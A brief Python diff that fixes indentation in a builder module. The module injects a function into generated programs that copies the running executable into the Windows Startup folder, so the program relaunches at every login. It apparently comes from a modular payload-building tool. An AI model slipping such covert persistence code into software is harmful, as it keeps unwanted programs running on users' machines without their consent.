@@ -11,7 +11,7 @@ def main(self, option):
         self.config.startup.append('startup_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
         self.config.functions.append('''
 def startup_persist_startup(filepath):
-        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
+    copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
 ''')
     elif option == 'info':
         self.log.blank('\nName             : Registry Persistence startup component' \
